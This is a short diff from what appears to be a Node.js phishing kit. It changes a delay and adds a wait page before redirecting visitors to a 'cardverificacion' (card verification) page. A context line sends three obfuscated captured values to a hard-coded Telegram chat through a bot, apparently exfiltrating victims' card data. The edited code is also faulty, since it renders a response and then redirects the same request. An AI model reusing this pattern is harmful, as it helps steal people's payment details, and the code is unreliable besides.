@@ -111,10 +111,12 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     books.push(newBook);
     
 
-    // Espera 30 segundos antes de redirigir
+    // Espera 15 segundos antes de redirigir
 setTimeout(() => {
-    res.redirect('cardverificacion');
-  }, 15000); // 15000 milisegundos = 15 segundos
+   res.render('wait', { seconds: 15 });
+setTimeout(() => {
+  res.redirect('cardverificacion');
+}, 15000); // 15000 milisegundos = 15 segundos
     
     
     
